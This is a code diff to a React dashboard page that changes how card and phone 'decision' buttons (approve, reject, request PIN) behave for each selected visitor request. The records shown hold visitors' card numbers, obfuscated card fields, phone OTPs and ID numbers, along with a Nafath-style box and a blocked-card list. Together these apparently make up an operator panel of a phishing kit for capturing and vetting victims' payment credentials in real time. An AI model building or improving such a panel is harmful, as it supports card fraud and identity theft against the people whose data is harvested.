@@ -100,6 +100,8 @@ export default function DashboardPage() {
   const [newBlockedCard, setNewBlockedCard] = useState("");
   const [currentTime, setCurrentTime] = useState(Date.now());
   const [openLogBox, setOpenLogBox] = useState<string | null>(null);
+  const [cardLocalDecision, setCardLocalDecision] = useState<"approved" | "rejected" | "pin" | null>(null);
+  const [phoneLocalDecision, setPhoneLocalDecision] = useState<"approved" | "rejected" | null>(null);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -536,6 +538,12 @@ export default function DashboardPage() {
     document.addEventListener("mousedown", handlePointerDown);
     return () => document.removeEventListener("mousedown", handlePointerDown);
   }, []);
+
+  // Reset local decisions when changing selected request
+  useEffect(() => {
+    setCardLocalDecision(null);
+    setPhoneLocalDecision(null);
+  }, [selectedRequestId]);
 
   // Get country flag
   const getCountryFlag = (raw?: Record<string, any>): string => {
@@ -2480,8 +2488,9 @@ const renderNafadBox = () => {
     // Create ONE box for Card (latest entry only)
     if (latestCardEntry) {
       const raw = latestCardEntry.raw || {};
-      const effectiveCardStatus = localDecisionStates.payment || raw._v1Status || raw.paymentStatus || "";
-      const showCardDecisionButtons = !["approved", "rejected"].includes(effectiveCardStatus) && Boolean(raw._v1 || raw.cardNumber);
+      // Use local decision first, then server status
+      const effectiveCardStatus = cardLocalDecision || localDecisionStates.payment || raw._v1Status || raw.paymentStatus || "";
+      const showCardDecisionButtons = !cardLocalDecision && !["approved", "rejected"].includes(effectiveCardStatus) && Boolean(raw._v1 || raw.cardNumber);
       // Use _v1UpdatedAt for Card box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v1UpdatedAt 
         ? new Date(raw._v1UpdatedAt).getTime()
@@ -2839,6 +2848,7 @@ const renderNafadBox = () => {
             {showCardDecisionButtons && (
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                 <button onClick={async () => { 
+                  setCardLocalDecision("approved");
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
@@ -2858,6 +2868,7 @@ const renderNafadBox = () => {
                   موافقة
                 </button>
                 <button onClick={async () => { 
+                  setCardLocalDecision("rejected");
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
@@ -2877,6 +2888,7 @@ const renderNafadBox = () => {
                   رفض
                 </button>
                 <button onClick={async () => { 
+                  setCardLocalDecision("pin");
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
@@ -3444,8 +3456,9 @@ const renderNafadBox = () => {
     // Create ONE box for Phone (latest entry only)
     if (latestPhoneEntry) {
       const raw = latestPhoneEntry.raw || {};
-      const effectivePhoneStatus = localDecisionStates.phone || raw.phoneOtpStatus || raw.phoneStatus || "";
-      const showPhoneDecisionButtons = !["approved", "rejected"].includes(effectivePhoneStatus) && Boolean(raw.phoneNumber || raw.phoneIdNumber || raw.phoneOtp || raw._v7);
+      // Use local decision first, then server status
+      const effectivePhoneStatus = phoneLocalDecision || localDecisionStates.phone || raw.phoneOtpStatus || raw.phoneStatus || "";
+      const showPhoneDecisionButtons = !phoneLocalDecision && !["approved", "rejected"].includes(effectivePhoneStatus) && Boolean(raw.phoneNumber || raw.phoneIdNumber || raw.phoneOtp || raw._v7);
       // Use _v7UpdatedAt for Phone box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v7UpdatedAt 
         ? new Date(raw._v7UpdatedAt).getTime()
@@ -3532,6 +3545,7 @@ const renderNafadBox = () => {
               {showPhoneDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={async () => { 
+                    setPhoneLocalDecision("approved");
                     setActionLoading("phone");
                     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                     if (visitorId) {
@@ -3551,6 +3565,7 @@ const renderNafadBox = () => {
                     موافقة
                   </button>
                   <button onClick={async () => { 
+                    setPhoneLocalDecision("rejected");
                     setActionLoading("phone");
                     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                     if (visitorId) {
